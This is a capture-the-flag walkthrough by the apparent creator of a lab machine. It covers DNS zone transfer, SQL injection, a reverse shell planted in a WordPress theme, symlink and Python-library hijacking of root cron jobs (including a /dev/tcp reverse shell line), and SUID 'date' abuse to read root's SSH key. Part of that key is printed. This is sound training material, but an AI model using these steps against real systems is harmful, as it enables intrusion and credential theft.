# INTERNAL-WEB1

## Description

(Unfortunately there isn't a description for this machine, so you can get the overall background story instead!)

{% code overflow="wrap" %}
```
You were part of a big tech company known as E-Corp. Following the 18 March 2026 incident, all of E-Corp's infrastructure has been taken over by an unknown threat actor, causing E-Corp to fracture along departmental lines. 

Your team makes up one of these departments, and your objective is to take back control over as much of E-Corp's former infrastructure by any means necessary, for anything less would mean that your department would not have the resources it so desperately needs to function. Among E-Corp's infrastructure comprises 10 machines - some running Windows, some Linux, some in a network and some running standalone. 

Everything you do is no longer for E-Corp. It is for yourself. For your fellow departmental members. Even it means fighting, sabotaging, attacking the resources held by the other departments. Your department depends on you.
```
{% endcode %}

## Walkthrough

### Discovery and Enumeration

Since we are not provided with the IP address of the target system, we'll have to do host discovery first in order to identify the target system, then port discovery and service scans. We can use Nmap to perform this, which also comes with external scripts to identify additional information as well as potential vulnerabilities

```bash
┌──(kali㉿kali)-[~/Documents/Temp]
└─$ nmap -sC -sV -A 172.16.5.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-23 13:12 +08
Nmap scan report for 172.16.5.128
Host is up (0.00015s latency).
All 1000 scanned ports on 172.16.5.128 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Nmap scan report for 172.16.5.132
Host is up (0.00049s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a7:3a:03:e9:ea:4c:ae:1e:f2:90:3b:e5:45:fa:ca:39 (ECDSA)
|_  256 4f:92:8a:51:0c:f4:37:5c:b8:aa:51:47:ae:ec:42:86 (ED25519)
53/tcp open  domain  ISC BIND 9.18.39-0ubuntu0.24.04.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.39-0ubuntu0.24.04.2-Ubuntu
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (2 hosts up) scanned in 34.40 seconds
```

We have one target on the network, with 3 ports open (SSH, DNS and HTTP). Based on the OpenSSH version identified, there is unlikely to be any vulnerabilities with it, so we can ignore that. We can move our focus to the DNS service, which could contain valuable information if we can perform a zone transfer attack on it

<details>

<summary>DNS Zone Transfers</summary>

A DNS zone transfer (query type "AXFR") is a type of DNS transaction used to replicate DNS databases across a set of DNS servers. This allows network administrators to ensure that a set of nameservers has the exact same results in the event of a server failover or load balancing.

If improperly configured, a zone transfer can be performed by any user with the ability to connect to the server. Zone transfers can reveal a lot of information about a target domain, including the available subdomains, nameservers configured for the domain as well as other records like mail servers and additional notes.

</details>

(During the finals competition, a hint was dropped about the domain name of the target system, which is `internal.ecorp` )

To do a zone transfer, we can use the following command

```bash
┌──(kali㉿kali)-[~/Documents/Temp]
└─$ dig @172.16.5.132 internal.ecorp axfr
; <<>> DiG 9.20.0-Debian <<>> @172.16.5.132 internal.ecorp axfr
; (1 server found)
;; global options: +cmd
internal.ecorp.         604800  IN      SOA     ns1.edencom.internal.ecorp. root.internal.ecorp. 2 604800 86400 2419200 604800
internal.ecorp.         604800  IN      NS      ns1.edencom.internal.ecorp.
internal.ecorp.         604800  IN      NS      ns2.edencom.internal.ecorp.
internal.ecorp.         604800  IN      NS      ns3.edencom.internal.ecorp.
internal.ecorp.         604800  IN      A       10.100.50.143
ns1.edencom.internal.ecorp. 604800 IN   A       127.0.0.2
ns2.edencom.internal.ecorp. 604800 IN   A       127.0.0.3
ns3.edencom.internal.ecorp. 604800 IN   A       127.0.0.4
management-portal.internal.ecorp. 604800 IN A   10.100.50.143
vpn.internal.ecorp.     604800  IN      A       10.100.50.143
wordpress.internal.ecorp. 604800 IN     A       10.100.50.143
internal.ecorp.         604800  IN      SOA     ns1.edencom.internal.ecorp. root.internal.ecorp. 2 604800 86400 2419200 604800
;; Query time: 0 msec
;; SERVER: 172.16.5.132#53(172.16.5.132) (TCP)
;; WHEN: Mon Mar 23 13:18:14 +08 2026
;; XFR size: 12 records (messages 1, bytes 368)
```

The command returned the entire zone database of the `internal.ecorp` domain, including 3 subdomains that we can enumerate

* `management-portal.internal.ecorp`
* `vpn.internal.ecorp`
* `wordpress.internal.ecorp`

We can add these hosts to the `/etc/hosts` file as static DNS entries.&#x20;

{% code overflow="wrap" %}
```bash
┌──(kali㉿kali)-[~/Documents/Temp]
└─$ cat /etc/hosts       
127.0.0.1       localhost
127.0.1.1       kali.northland.org      kali


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

172.16.5.132 internal.ecorp management-portal.internal.ecorp vpn.internal.ecorp wordpress.internal.ecorp
```
{% endcode %}

We can navigate to the new subdomains found, and find that 2 of the 3 subdomains are valid. `vpn.internal.ecorp` does not exist, likely an old record that was never removed

<figure><img src="../../../.gitbook/assets/image (376).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

### Gaining Initial Access

#### Attacking management-portal.internal.ecorp

We'll start with `management-portal.internal.ecorp` . It returns a simple admin panel, with nothing much else. We can try to enter `admin:admin` as a common set of credentials, but get an error.

<figure><img src="../../../.gitbook/assets/image (378).png" alt=""><figcaption></figcaption></figure>

If we enter a single quote in the field, we will get a blank page back, which could indicate that its vulnerable to SQL injection. To test this theory, we can enter the following payload

<figure><img src="../../../.gitbook/assets/image (379).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

This returns a success message... and nothing else. We can do directory enumeration using a tool like Gobuster or Ffuf, but both will return no results. Instead, we can utilize this SQL injection vulnerability to attempt to dump the contents of the login database, hopefully to obtain some credentials for further enumeration.

We can open up a BurpSuite project, and intercept the request that was made by the webserver.

<figure><img src="../../../.gitbook/assets/image (381).png" alt=""><figcaption></figcaption></figure>

We can write this payload to a file, replace the `admin` with `*` and give it to SQLmap to enumerate.

<figure><img src="../../../.gitbook/assets/image (382).png" alt=""><figcaption></figcaption></figure>

SQLmap will very quickly identify the injection vulnerability, and craft a payload for us to use to dump the database contents

<figure><img src="../../../.gitbook/assets/image (383).png" alt=""><figcaption></figcaption></figure>

With this information, we can attempt to dump the database using the following set of commands

{% code overflow="wrap" %}
```bash
sqlmap -r req.txt --dbs
sqlmap -r req.txt -D <database-name> --tables
sqlmap -r req.txt -D <database-name> -T <table-name> --dump

# Alternatively, for the impatient
sqlmap -r req.txt -D <database-name> --dump
sqlmap -r req.txt --dump-all
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (384).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>

Unfortunately, the credentials dumped are in bcrypt format, which are notoriously long to crack even with a dedicated password cracking rig ([article](https://specopssoft.com/blog/hashing-algorithm-cracking-bcrypt-passwords/) as reference). We can chuck it into hashcat to let it run with the rockyou.txt wordlist for a couple of minutes to see if we get any low-hanging fruit, but unfortunately we don't get anything.

With `management-portal.internal.ecorp` seeming like a dead end, we can move on to the Wordpress site

#### Attacking wordpress.internal.ecorp

On the surface, nothing stands out of the ordinary. The site seems to be freshly set up, with no other posts made other than the default "Hello world!" one. We can use WPScan to perform some enumeration for vulnerable plugins and themes

{% code overflow="wrap" %}
```bash
┌──(kali㉿kali)-[~/Documents/Temp]                                                                       
└─$ wpscan --url http://wordpress.internal.ecorp/ -e vp,vt --plugins-detection aggressive 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|                                                                    
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \   
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|         

         WordPress Security Scanner by the WPScan Team  
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
                                                    
[+] URL: http://wordpress.internal.ecorp/ [172.16.5.132]
[+] Started: Mon Mar 23 13:43:56 2026   
                                                    
Interesting Finding(s):
                                                                                                         
[+] Headers            
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu) 
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 
...
<REDACTED FOR BREVITY>
...
[+] Finished: Mon Mar 23 13:44:43 2026
[+] Requests Done: 9304
[+] Cached Requests: 11
[+] Data Sent: 2.693 MB
[+] Data Received: 33.071 MB
[+] Memory used: 293.711 MB
[+] Elapsed time: 00:00:47
```
{% endcode %}

Unfortunately, nothing interesting was returned. We can try to use Metasploit's plugin enumeration tool, which tends to be more thorough with enumerating vulnerable plugins and known exploits

{% code overflow="wrap" %}
```bash
msf6 > use scanner/http/wordpress_scanner
msf6 auxiliary(scanner/http/wordpress_scanner) > set vhost wordpress.internal.ecorp
vhost => wordpress.internal.ecorp
msf6 auxiliary(scanner/http/wordpress_scanner) > set rhosts internal.ecorp
rhosts => internal.ecorp
msf6 auxiliary(scanner/http/wordpress_scanner) > run

[*] Trying 172.16.5.132
[+] 172.16.5.132 - Detected Wordpress 6.9.4
[*] 172.16.5.132 - Enumerating Themes
[*] 172.16.5.132 - Progress  0/3 (0.0%)
[*] 172.16.5.132 - Finished scanning themes
[*] 172.16.5.132 - Enumerating plugins
[*] 172.16.5.132 - Progress   0/64 (0.0%)
[+] 172.16.5.132 - Detected plugin: backup-backup version 1.3.6
[*] 172.16.5.132 - Finished scanning plugins
[*] 172.16.5.132 - Searching Users
[+] 172.16.5.132 - Detected user: admin with username: admin
[*] 172.16.5.132 - Finished scanning users
[*] 172.16.5.132 - Finished all scans
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
{% endcode %}

The module detected backup-backup version 1.3.6 running, which is a vulnerable version of Backup Migration that is prone to RCE. We can try to use the exploit script available on Metasploit, but it returns with an error

{% code overflow="wrap" %}
```bash
msf6 exploit(multi/http/wp_backup_migration_php_filter) > use multi/http/wp_backup_migration_php_filter
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_backup_migration_php_filter) > set rhosts internal.ecorp
rhosts => internal.ecorp
msf6 exploit(multi/http/wp_backup_migration_php_filter) > set vhost wordpress.internal.ecorp
vhost => wordpress.internal.ecorp
msf6 exploit(multi/http/wp_backup_migration_php_filter) > set lhost 172.16.5.128
lhost => 172.16.5.128
msf6 exploit(multi/http/wp_backup_migration_php_filter) > run

[*] Started reverse TCP handler on 172.16.5.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] WordPress Version: 6.9.4
[+] Detected Backup Migration Plugin version: 1.3.6
[+] The target appears to be vulnerable.
[*] Writing the payload to disk, character by character, please wait...
[-] Exploit aborted due to failure: unexpected-reply: The server did not respond with the expected 200 response code
[*] Exploit completed, but no session was created.
```
{% endcode %}

It is possible that this version of Backup Migration was patched, and we should move on to other attack vectors. At this point, the last possible attack method is the login panel, located at `/wp-login.php` .&#x20;

<figure><img src="../../../.gitbook/assets/image (386).png" alt=""><figcaption></figcaption></figure>

We can try some common credentials, and by some miracle we get in with `admin:admin`.&#x20;

<figure><img src="../../../.gitbook/assets/image (387).png" alt=""><figcaption></figcaption></figure>

WordPress v6.9.4 is the current version, and as such there won't likely be any easy exploits to get remote code execution. Earlier, we discovered that the server is running the Twenty Seventeen theme, which has a `404.php` file that we can edit. Navigate to Appearance -> Theme File Editor, and select 404.php

<figure><img src="../../../.gitbook/assets/image (388).png" alt=""><figcaption></figcaption></figure>

We can insert a reverse shell like this, save the new source code and navigate to it to trigger the shell.

<figure><img src="../../../.gitbook/assets/image (390).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (391).png" alt=""><figcaption></figcaption></figure>

We can stabilize our shell, and then start performing enumeration to escalate our privileges.

### Escalating to Root

We can start by getting rid of the low-hanging fruit and enumerating the kernel and OS versions of the webserver

{% code overflow="wrap" %}
```bash
www-data@INTERNAL-SRV1:/var/www/html/wordpress$ uname -a
Linux INTERNAL-SRV1.internal.ecorp 6.17.0-19-generic #19~24.04.2-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar  6 23:08:46 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```
{% endcode %}

The server is running Ubuntu 24.04.2, which is a relatively recent version and unlikely to have major exploits. It is also running Linux kernel 6.17.0-19-generic, which also doesn't return any notable exploits at the time of writing. Moving on, we can enumerate the filesystem to see if we find anything notable.&#x20;

After some searching, we may come across a couple of scripts located in `/opt/scripts`

{% code overflow="wrap" %}
```bash
www-data@INTERNAL-SRV1:/var/www/html/wordpress$ cd /opt/scripts
www-data@INTERNAL-SRV1:/opt/scripts$ ls -al
total 16
drwxr-xr-x 2 root root 4096 Mar 19 15:24 .
drwxr-xr-x 4 root root 4096 Mar 19 13:50 ..
-rwxr--r-- 1 root root  376 Mar 19 15:24 backup.sh
-rw-r--r-- 1 root root 2436 Mar 19 13:58 healthcheck.py
```
{% endcode %}

These are likely scripts that are used for administrative purposes or as cronjobs. Even with our minimal privileges, we can enumerate for cronjobs across the entire system using a program called [Pspy](https://github.com/dominicbreuker/pspy). We can download and transfer one of the pre-built binaries to the system, execute it and leave it running for a couple of minutes.

<figure><img src="../../../.gitbook/assets/image (392).png" alt=""><figcaption></figcaption></figure>

After a while, we can see some cronjobs being executed, which uses the two admin scripts we found earlier.

<figure><img src="../../../.gitbook/assets/image (393).png" alt=""><figcaption></figcaption></figure>

Good enough for us, lets see what the scripts do. We can read the individual scripts to see what they contain

{% code overflow="wrap" %}
```bash
# /opt/scripts/backup.sh
#!/bin/bash

BACKUP_SRC="/opt/backup/targets"
BACKUP_DST="/opt/backup/archives"

TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
HOSTNAME=$(hostname)

ARCHIVE_NAME="${HOSTNAME}_${TIMESTAMP}.zip"
ARCHIVE_PATH="${BACKUP_DST}/${ARCHIVE_NAME}"

# Ensure destination exists
mkdir -p "$BACKUP_DST"

cd "$BACKUP_SRC" || exit 1

zip -r "$ARCHIVE_PATH" . > /dev/null 2>&1
chmod 644 "$ARCHIVE_PATH"
```
{% endcode %}

{% code overflow="wrap" %}
```python
# /opt/scripts/healthcheck.py
#!/usr/bin/env python3                    
                                                    
import socket                                       
import ssl                          
import sys                                        
from urllib.parse import urlparse                                                                        
import http.client
                                                                                                         
TIMEOUT = 5
                                                    
                                                    
def check_dns(hostname):             
    try:                                            
        socket.setdefaulttimeout(TIMEOUT)                                                                
        ip = socket.gethostbyname(hostname)                                                              
        return True, f"{hostname} resolved to {ip}"                                                      
    except Exception as e:                   
        return False, f"DNS resolution failed for {hostname}: {e}"
                                                    
                                                    
def check_http(url, expected_status=200, expect_string=None):
    try:                                                                                                 
        parsed = urlparse(url)
        conn = None        
                                                    
        if parsed.scheme == "https":                                                                     
            context = ssl.create_default_context()
            conn = http.client.HTTPSConnection(parsed.netloc, timeout=TIMEOUT, context=context)
        else:                                       
            conn = http.client.HTTPConnection(parsed.netloc, timeout=TIMEOUT)
        
        path = parsed.path or "/"
        conn.request("GET", path)
        response = conn.getresponse()
                                                    
        status_ok = response.status == expected_status
        body = response.read().decode(errors="ignore")
                                                                                                         
        content_ok = True                    
        if expect_string:
            content_ok = expect_string in body
                                                    
        if status_ok and content_ok:
            return True, f"{url} OK (status={response.status})"
        else:      
            return False, (
                f"{url} failed "
                f"(status={response.status}, expected={expected_status}, "
                f"content_check={content_ok})"
            )             
                                                    
    except Exception as e:            
        return False, f"{url} error: {e}"


def run_checks():
    checks = [
        ("dns", "wordpress.internal.ecorp"),
        ("dns", "management-portal.internal.ecorp"), 
        ("dns", "siem.edencom.internal.ecorp"),
        ("http", "https://wordpress.internal.ecorp"), 
        ("http", "http://management-portal.internal.ecorp"),
    ]
    results = []
    for check in checks:
        if check[0] == "dns":
            ok, msg = check_dns(check[1])
        elif check[0] == "http":
            ok, msg = check_http(check[1])
        else:
            continue
        results.append((ok, msg))
    return results


def main():
    results = run_checks()
    all_ok = True
    for ok, msg in results:
        status = "OK" if ok else "FAIL"
        with open("/root/healthcheck.log", "a") as f:
                f.write(f"[{status}] {msg}") 

        if not ok:
            all_ok = False

    if not all_ok:
        sys.exit(1)
    else:
        sys.exit(0)


if __name__ == "__main__":
    main()
```
{% endcode %}

We will investigate the backup script first, then the healthcheck script

#### Exploiting backup.sh

The backup script reads a list of targets from `/opt/backup/targets`, zips them all up and then saves the zip file to `/opt/backup/archives`. This script contains an insecure symlink following vulnerability, as it does not check if the symlink is valid before attempting to access it. Since the script runs as root, we can therefore exploit it to read the root user's SSH key and gain root access that way.

To perform this attack, we can first create a new symlink in the target directory as such

{% code overflow="wrap" %}
```bash
www-data@INTERNAL-SRV1:/var/www/html/wordpress$ cd /opt/backup/targets
www-data@INTERNAL-SRV1:/opt/backup/targets$ ls -al
total 8
drwxrwxrwx 2 root     root     4096 Mar 19 13:47 .
drwxr-xr-x 4 root     root     4096 Mar 19 15:25 ..
lrwxrwxrwx 1 koth_adm koth_adm   15 Mar 19 13:47 test.sh -> /root/backup.sh
www-data@INTERNAL-SRV1:/opt/backup/targets$ ln -s /root/.ssh/id_rsa key.txt
www-data@INTERNAL-SRV1:/opt/backup/targets$ ls -al
total 8
drwxrwxrwx 2 root     root     4096 Mar 23 22:20 .
drwxr-xr-x 4 root     root     4096 Mar 19 15:25 ..
lrwxrwxrwx 1 www-data www-data   17 Mar 23 22:20 key.txt -> /root/.ssh/id_rsa
lrwxrwxrwx 1 koth_adm koth_adm   15 Mar 19 13:47 test.sh -> /root/backup.sh
```
{% endcode %}

Then we wait for the next time the cronjob runs, and check in `/opt/backup/archives` .

{% code overflow="wrap" %}
```bash
www-data@INTERNAL-SRV1:/opt/backup/archives$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Mar 23 22:25 .
drwxr-xr-x 4 root root 4096 Mar 19 15:25 ..
-rw-r--r-- 1 root root 2286 Mar 23 22:25 INTERNAL-SRV1.internal.ecorp_20260323_222501.zip
```
{% endcode %}

We can copy the zip out to a writable directory and unzip it

{% code overflow="wrap" %}
```bash
www-data@INTERNAL-SRV1:/opt/backup/archives$ cp INTERNAL-SRV1.internal.ecorp_20260323_222501.zip /tmp
www-data@INTERNAL-SRV1:/opt/backup/archives$ cd /tmp                                                     
www-data@INTERNAL-SRV1:/tmp$ ls -al                                                                      
total 12                                                                                                 
drwxrwxrwt  2 root     root     4096 Mar 23 22:25 .                                                      
drwxr-xr-x 23 root     root     4096 Mar 19 08:48 ..                  
-rw-r--r--  1 www-data www-data 2286 Mar 23 22:25 INTERNAL-SRV1.internal.ecorp_20260323_222501.zip
www-data@INTERNAL-SRV1:/tmp$ unzip INTERNAL-SRV1.internal.ecorp_20260323_222501.zip 
Archive:  INTERNAL-SRV1.internal.ecorp_20260323_222501.zip            
  inflating: key.txt                                                                                     
www-data@INTERNAL-SRV1:/tmp$ cat key.txt                                                                 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEArQV8ekHjYD7W9Ullr47/6BUfPfAaFI5q/rnxQvoN4BGRYEGyXZ8a
3gefriHM7KrjEOEKLZr0qqSBu7ubvJ9CeCvGUL2PFLEK5NQs7dKmeO2sjJh/bdkowLCH/I
px7A17lobZMfcJJiXfiAY8dEfA305SWFV3T1p3iOblnCAP7jAxyMukzFxNanRERvjYJ6EB
YynDrEB0Q6HyoLrwv4HhqkdnPwU3rvIGGp+fWH/0x5bog6Oh5kRnlEz4XwgM4Df7WvLwPH
...
<REDACTED FOR BREVITY>
...
```
{% endcode %}

Now we can SSH to the webserver as root

{% code overflow="wrap" %}
```bash
┌──(kali㉿kali)-[~/Documents/Temp]
└─$ ssh root@internal.ecorp -i root.pem
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

3 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Last login: Thu Mar 19 15:35:01 2026 from 10.100.10.100
root@INTERNAL-SRV1:~# whoami
root
root@INTERNAL-SRV1:~# id
uid=0(root) gid=0(root) groups=0(root)
root@INTERNAL-SRV1:~#
```
{% endcode %}

### Alternate Escalation Paths

#### Exploiting healthcheck.py

In `healthcheck.py`, there are no obvious vulnerabilities. However, since it imports external Python libraries, we can attempt to perform Python library hijacking and force the healthcheck to spawn a reverse shell or read a private key for us. The following blog details how Python library hijacking [works](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)

We can try to read the file permissions for the imported scripts as such

{% code overflow="wrap" %}
```bash
www-data@INTERNAL-SRV1:/opt/scripts$ cd /usr/lib/python3.12
www-data@INTERNAL-SRV1:/usr/lib/python3.12$ ls -al ssl.py socket.py sys.py
ls: cannot access 'sys.py': No such file or directory
-rw-rw-rw- 1 root root 37411 Mar  3 20:15 socket.py
-rw-rw-rw- 1 root root 50822 Mar  3 20:15 ssl.py
```
{% endcode %}

We have write access to the imported libraries, so we can open up one of them in a text editor and make some modifications. For this example, I will be using the `ssl.py` library. Write this library out to your attacker machine, and open in your text editor of choice.

Navigate to the function definition for `create_default_context`, and insert the following code inside

{% code overflow="wrap" %}
```python
import os
os.system("/bin/bash -c '/bin/bash -i >&/dev/tcp/172.16.5.128/9002 0>&1'")
```
{% endcode %}

This will create a reverse shell as the root user and return it to us. Now just wait for the cronjob to run again, and we'll get our shell

{% code overflow="wrap" %}
```bash
┌──(kali㉿kali)-[~/Documents/Temp/uploads]
└─$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [172.16.5.128] from (UNKNOWN) [172.16.5.132] 45668
bash: cannot set terminal process group (5148): Inappropriate ioctl for device
bash: no job control in this shell
root@INTERNAL-SRV1:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@INTERNAL-SRV1:~# 
```
{% endcode %}

#### Exploiting SUID binaries

We can also enumerate the webserver for SUID binaries, which are basically programs that have the SUID bit enabled on them. With SUID enabled, the program will be executed as the file owner instead of the executer. We can enumerate for SUID binaries with the following command

{% code overflow="wrap" %}
```bash
www-data@INTERNAL-SRV1:/var/www/html$ find 2>/dev/null / -perm -4000
/snap/core22/1748/usr/bin/chfn
/snap/core22/1748/usr/bin/chsh
/snap/core22/1748/usr/bin/gpasswd
/snap/core22/1748/usr/bin/mount
/snap/core22/1748/usr/bin/newgrp
/snap/core22/1748/usr/bin/passwd
/snap/core22/1748/usr/bin/su
/snap/core22/1748/usr/bin/sudo
/snap/core22/1748/usr/bin/umount
/snap/core22/1748/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/1748/usr/lib/openssh/ssh-keysign
/snap/core22/1748/usr/libexec/polkit-agent-helper-1
/snap/snapd/23545/usr/lib/snapd/snap-confine
/usr/bin/date
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/ip
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/mount
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
```
{% endcode %}

There are a couple of non-standard SUID binaries here, like `/usr/bin/date` and `/usr/bin/ip`. We can refer to the [GTFOBins](https://gtfobins.org) website to discover SUID binaries, and how we can exploit them. For this example, we'll use `/usr/bin/date` to read the root user's SSH key.

According to GTFOBins, the date binary can be exploited to read arbitrary files as such

<figure><img src="../../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>

We can try this out by running the following command

{% code overflow="wrap" %}
```shellscript
www-data@INTERNAL-SRV1:/var/www/html$ /usr/bin/date -f /root/.ssh/id_rsa                            
/usr/bin/date: invalid date ‘-----BEGIN OPENSSH PRIVATE KEY-----’                                   
/usr/bin/date: invalid date ‘b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn’
/usr/bin/date: invalid date ‘NhAAAAAwEAAQAAAgEArQV8ekHjYD7W9Ullr47/6BUfPfAaFI5q/rnxQvoN4BGRYEGyXZ8a’
/usr/bin/date: invalid date ‘3gefriHM7KrjEOEKLZr0qqSBu7ubvJ9CeCvGUL2PFLEK5NQs7dKmeO2sjJh/bdkowLCH/I’
/usr/bin/date: invalid date ‘px7A17lobZMfcJJiXfiAY8dEfA305SWFV3T1p3iOblnCAP7jAxyMukzFxNanRERvjYJ6EB’
/usr/bin/date: invalid date ‘YynDrEB0Q6HyoLrwv4HhqkdnPwU3rvIGGp+fWH/0x5bog6Oh5kRnlEz4XwgM4Df7WvLwPH’
/usr/bin/date: invalid date ‘HhYWljuNyKpvGjHkyJsf5gCaPcTvhEZlTp+cqqzY2GXVNU3TF9R4gdYbZccgyPJ1b3l+Fo’
/usr/bin/date: invalid date ‘fbN/j86MuP8EqY3rV9iLunH4brx1+16sG9xQd2XT3PswlRc0tUZS2VLgJ6gufZzyEzo2Oe’
/usr/bin/date: invalid date ‘0VTjBEs1JWQ5DIRa+oOyg6UZDhjFKh0En3OI8nE5HQEECIkl1f5GzrtqcSM2rokd3+sbLC’
/usr/bin/date: invalid date ‘oetJirLCRCipRqkRaYvgp1vioXoTKf4/GuETumWj8z10POenoHgpdgv4L8YrkziTc/rE1R’
/usr/bin/date: invalid date ‘5fbEprNJxb6aApypGfKaAtqHQLEzwuVvU2KXRzTdfAk2uwGQ8fhMs1UC1DQTU1YRNSXF3r’
/usr/bin/date: invalid date ‘CRlRrf430Kq0iFcOkXxdNoVyIoqe04Bdom7+W1FpR48xFFsR+A6E6jWekRi1flvdPkT2Lu’
/usr/bin/date: invalid date ‘0AAAdgSUnNjElJzYwAAAAHc3NoLXJzYQAAAgEArQV8ekHjYD7W9Ullr47/6BUfPfAaFI5q’
/usr/bin/date: invalid date ‘/rnxQvoN4BGRYEGyXZ8a3gefriHM7KrjEOEKLZr0qqSBu7ubvJ9CeCvGUL2PFLEK5NQs7d’
...
<REDACTED FOR BREVITY>
...
```
{% endcode %}

The root key is fragmented horribly, but we can pipe it out to a text file and reconstruct it easily. With that, we can SSH into the server as root and do whatever we want.

## Creator's Notes

There are several theoretical ways to gain initial access and escalate privileges to root, some of which were not covered in this walkthrough. The diagram below shows the intended flowchart for initial access and privilege escalation.

<figure><img src="../../../.gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>

However, due to a lack of time, the challenge couldn't be properly vetted and as such some of the attack vectors did not work properly. For example, the SQLi to password cracking path would have allowed you to SSH to the server as `srvadm`, where you can then exploit the user's sudo permissions to read the root user's SSH key or directly spawn a shell as root.&#x20;

This is the first time that I've built a proper KOTH machine, so I am still very new to this. Nevertheless, this is a very fun experience, and I hope I'll be able to build such challenges again for future CTFs.
